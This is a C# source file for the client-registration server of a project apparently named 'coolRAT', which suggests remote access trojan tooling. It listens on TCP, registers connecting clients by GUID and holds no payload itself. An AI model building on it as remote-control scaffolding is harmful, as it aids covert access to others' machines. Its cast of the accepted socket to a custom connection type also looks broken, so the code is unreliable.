using coolRAT.Libs.Packets;
using System;
using System.Collections.Generic;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;

namespace coolRAT.Libs.Connections
{
    public class CAP_Server
    {
        public int ListeningPort;
        public TcpListener Listener;
        public Dictionary<Guid, Client> PartialClients;
        public Thread ConnectionAccepterThread;

        public CAP_Server(int listeningPort)
        {
            ListeningPort = listeningPort;
            Listener = new TcpListener(new IPEndPoint(IPAddress.Any, listeningPort));
            PartialClients = new Dictionary<Guid, Client>();
        }

        public void ListenerLoop()
        {
            while(true)
            {
                TcpConnection newConnection = (TcpConnection)Listener.AcceptTcpClient();
                newConnection.SendReadyMessage();
                string packet_raw = newConnection.ReceivePacket();
                Packet packet = Packet.Deserialize(packet_raw);
                if(packet.Type == "CAP_RegisterClientPacket")
                {
                    // Register a new partial client
                    Client newClient = new Client(Guid.NewGuid());
                    PartialClients.Add(newClient.UniqueId, newClient);
                    Console.WriteLine($"Registered clients: {PartialClients.Count}");
                    CAP_ClientRegisteredPacket registeredPacket = new CAP_ClientRegisteredPacket(newClient.UniqueId);
                    newConnection.WaitReadyMessage();
                    newConnection.SendPacket(registeredPacket);
                }
            }
        }

        public void Start()
        {
            if (ConnectionAccepterThread != null) if (ConnectionAccepterThread.IsAlive) Stop();
            ConnectionAccepterThread = new Thread(new ThreadStart(ListenerLoop));
            ConnectionAccepterThread.IsBackground = true;
            Listener.Start();
            ConnectionAccepterThread.Start();
        }

        public void Stop()
        {
            if (ConnectionAccepterThread == null) return;
            if (ConnectionAccepterThread.IsAlive) ConnectionAccepterThread.Abort();
            ConnectionAccepterThread = null;
        }
    }
}
